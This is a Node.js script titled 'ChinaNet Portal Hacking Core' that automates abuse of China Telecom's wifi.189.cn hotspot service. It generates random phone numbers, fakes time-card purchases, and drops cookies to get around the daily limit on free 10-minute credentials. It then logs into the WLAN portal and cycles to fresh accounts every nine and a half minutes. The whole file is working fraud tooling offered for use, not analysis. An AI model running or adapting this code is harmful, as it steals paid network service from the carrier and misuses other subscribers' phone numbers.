/**
 * ChinaNet Portal Hacking Core
 *
 * @date     2014-09-16 22:46:42
 * @author   Dolphin<dolphin.w.e@gmail.com>
 */

var http = require('http');
var https = require('https');
var parseUrl = require('url').parse;
var querystring = require('querystring');
var colors = require('./node_modules/colors');
var cheerio = require('./node_modules/cheerio');

var init = {
    cookie: undefined,
    phone: undefined,
    loginUrl: null
};

var colorConsole = function (str, color) {
    // 彩色输出
    var colorful = str[color];
    console.log(colorful ? colorful.bold : str);
};

var httpReq = (function (querystring, http) {
    var createOpt = function (opt) {
        var options = {
            method: 'POST',
            host: opt.host || 'wifi.189.cn',
            path: opt.path || '/',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': opt.contents.length
            }
        };
        if (opt.cookie) {
            options.headers.cookie = opt.cookie;
        }
        return options;
    };

    var post = function (opt, cb) {
        // 发起 POST 请求
        // callback: object response, string data
        opt.contents = querystring.stringify(opt.contents);

        var req = http.request(createOpt(opt), function (res) {
            res.setEncoding('utf8');
            var data = '';
            res.on('data', function (chunk) {
                data += chunk;
            }).on('end', function () {
                cb(res, data);
            });
        });

        req.on('error', function (e) {
            colorConsole('请求出错: ' + e.message + ',请检查网络连接\n', 'red');
        });

        req.write(opt.contents); // 写入请求内容
        req.end();
    };

    var get = function (url, cb) {
        // 发起 GET 请求
        // callback: object response, string data
        var req = http.get(url, function (res) {
            res.setEncoding('utf8');
            var data = '';
            res.on('data', function (chunk) {
                data += chunk;
            }).on('end', function () {
                cb(res, data);
            });
        });

        req.on('error', function (e) {
            colorConsole('请求出错: ' + e.message + ',请检查网络连接\n', 'red');
        });
    };

    return {
        post: post,
        get: get
    };
})(querystring, http);

var getRandomPhoneNum = function () {
    // return Number phoneNum
    var phoneNumPrefix = [135, 136, 137, 138, 139, 147, 150, 151, 152, 157, 158, 159, 182, 183, 184, 187, 188, 130, 131, 132, 155, 156, 185, 186, 133, 153, 180, 181, 189]; // 有效号段
    return phoneNumPrefix[Math.floor(Math.random() * phoneNumPrefix.length)] * 1e8 + Math.floor(Math.random() * 1e8);
};

var linkStart = function (curStatus) {
    // 发起请求，得到 cookie
    colorConsole('开始模拟购买时长卡\n', 'yellow');

    init.phone = getRandomPhoneNum();
    init.loginUrl = curStatus.loginUrl;

    httpReq.get('http://wifi.189.cn/service/index.jsp', function (res) {
        var cookie = res['headers']['set-cookie'][0].split(';')[0];
        init.cookie = cookie;
        colorConsole('获得的 cookie：' + cookie + '\n', 'cyan');
        getLoginInfo();
    });
};

var getLoginInfo = (function (init, httpReq) {
    var loginDelay = undefined; // 延迟登录

    var addGood = function ( /*optional*/ cb) {
        // 向购物车添加物品
        // callback: string username, string password
        colorConsole('开始模拟向购物车添加物品...\n', 'yellow');
        loginDelay = cb;

        var options = {
            path: '/service/cart.do',
            cookie: init.cookie,
            contents: {
                method: 'addGood',
                confirm: 'yes',
                cardId: 1,
                type: 1,
                count: 1
            }
        };

        httpReq.post(options, list);
    };

    var list = function () {
        // 打开购物车，使请求有效化
        colorConsole('打开购物车，使请求有效化...\n', 'yellow');

        var options = {
            path: '/service/cart.do',
            cookie: init.cookie,
            contents: {
                method: 'list'
            }
        };

        httpReq.post(options, getOrder);
    };

    var getOrder = function () {
        // 获取订单号
        colorConsole('开始获取订单号，手机号：' + init.phone + '...\n', 'yellow');

        var options = {
            path: '/service/user.do',
            cookie: init.cookie,
            contents: {
                method: 'buy',
                confirm: 'yes',
                shopCartFlag: 'shopCart',
                cardType: 1,
                cardPayType: 'yi',
                user_phone: '',
                smsVerifyCode: '',
                isBenJi: 'no',
                phone: init.phone,
                phone_1: init.phone
            }
        };

        httpReq.post(options, function (res, data) {
            if (data[0] === '1') {
                // 得到订单号，开始尝试登录
                init.phone++; // 为下次计算做准备
                var orderId = data.split(',')[1];
                colorConsole('得到的订单号：' + orderId + '\n', 'cyan');
                return getPwd(orderId);
            }
            if (data.indexOf('购物车为空') !== -1) {
                // 若没进行购物车添加，则重新发起请求
                colorConsole('购物车为空，将再次向购物车添加商品！\n', 'magenta');
                return addGood();
            }
            // 否则生成新的手机号重试
            colorConsole(data + ' || 没有得到订单号，将更新手机号后再次尝试！\n', 'grey');
            init.phone = getRandomPhoneNum(); // 生成新的手机号
            return getOrder();
        });
    };

    var getPwd = function (orderId) {
        // 获取帐密
        colorConsole('开始获取账号密码...\n', 'yellow');

        var options = {
            // 不带 cookie 以便多次获得账号密码
            // 否则第二次请求密码会返回'-1,很抱歉,您今天只能获取1次10分钟的时长卡!'
            path: '/clientApi.do',
            contents: {
                method: 'get10mCard',
                orderId: orderId
            }
        };

        httpReq.post(options, function (res, data) {
            colorConsole('收到的数据：' + data + '\n', 'cyan');
            if (data.indexOf('次数过多') !== -1) {
                return colorConsole('已达到当日请求数上限（50次），请手动刷新 IP\n', 'red');
            }
            var t = data.split(','); // 获取有效信息
            if (t[4] && t[5]) {
                if (loginDelay && typeof loginDelay === 'function') {
                    // 有回调时进行回调
                    // 否则开始登录
                    setTimeout(function () {
                        // 延迟一秒回调以便服务器处理账号密码
                        loginDelay(t[4], t[5]);
                        loginDelay = undefined;
                    }, 1000);
                } else {
                    login(t[4], t[5]);
                }
            } else {
                colorConsole('未获取到，开始下一组尝试...\n', 'grey');
                getOrder();
            }
        });
    };

    return addGood;
})(init, httpReq);

var login = function (uname, pwd) {
    // 登录
    colorConsole('开始登录...\n', 'yellow');

    var contents = {
        UserName: uname + '@wlan.sh.chntel.com',
        Password: pwd
    };

    contents = querystring.stringify(contents);

    var options = {
        method: 'POST',
        host: init.loginUrl.host,
        path: init.loginUrl.path,
        headers: {
            'User-Agent': 'CDMA+WLAN',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': contents.length
        }
    };

    var hackLogin = function () {
        var req = https.request(options, function (res) {
            res.setEncoding('utf8');
            var xml = '';
            res.on('data', function (chunk) {
                xml += chunk;
            }).on('end', function () {
                checkLogin(xml);
            });
        });

        req.on('error', function (e) {
            colorConsole('请求出错: ' + e.message + ',请检查网络连接\n', 'red');
        });

        req.write(contents);
        req.end();
    };

    var isSecondTry = false; // 两次尝试计数
    var checkLogin = function (xml) {
        var $ = cheerio.load(xml, {
            xmlMode: true
        });

        var loginStatus = $('ResponseCode').text();

        if (loginStatus && parseInt(loginStatus) === 50) {
            colorConsole('登录成功！九分半后开始切换账号\t' + new Date().toTimeString().slice(0, 8) + '\n\n======= Hacked By Dolphin With Node.js =======\n', 'green');

            setTimeout(function () {
                // 九分半触发定时器
                logoff($('LogoffURL').text().trim());
            }, 570000);
        } else {
            if (isSecondTry) {
                // 两次登录都失败就放弃吧
                colorConsole('第二次登录失败，开始下一组尝试...\n', 'grey');
                getLoginInfo();
            } else {
                // 电信渣服务器可能不能即时处理分配到的账号密码
                colorConsole('登录失败，一秒后再次尝试登录...\n', 'magenta');
                setTimeout(function () {
                    isSecondTry = true; // 标记第二次尝试
                    hackLogin();
                }, 1000);
            }
        }
    };

    hackLogin();
};

var logoff = function (url) {
    // 注销再次登录
    url = parseUrl(url);

    getLoginInfo(function (uname, pwd) {
        colorConsole('开始注销登录\n', 'magenta');

        https.get({
            host: url.host,
            path: url.path,
            headers: {
                'User-Agent': 'CDMA+WLAN'
            }
        }, function (res) {
            res.setEncoding('utf8');
            var xml = '';
            res.on('data', function (chunk) {
                // 得到的是一个 xml 文件
                xml += chunk;
            }).on('end', function () {
                var $ = cheerio.load(xml, {
                    xmlMode: true
                });
                var logoffStatus = $('ResponseCode').text();
                if (logoffStatus && parseInt(logoffStatus) === 150) {
                    colorConsole('> 注销成功\n', 'green');
                    login(uname, pwd);
                } else {
                    colorConsole('> 注销失败\n', 'red');
                }
            });
        }).on('error', function (e) {
            colorConsole('请求出错: ' + e.message + ',请检查网络连接\n', 'red');
        });
    });
};

// 进程会话
process.on('message', function (curStatus) {
    if (curStatus.crashed) {
        colorConsole('\n主进程已重新启动！\n', 'yellow');
    }
    linkStart(curStatus);
}).on('uncaughtException', function (err) {
    // 异常抛出
    colorConsole(err.stack, 'red');
    process.exit();
});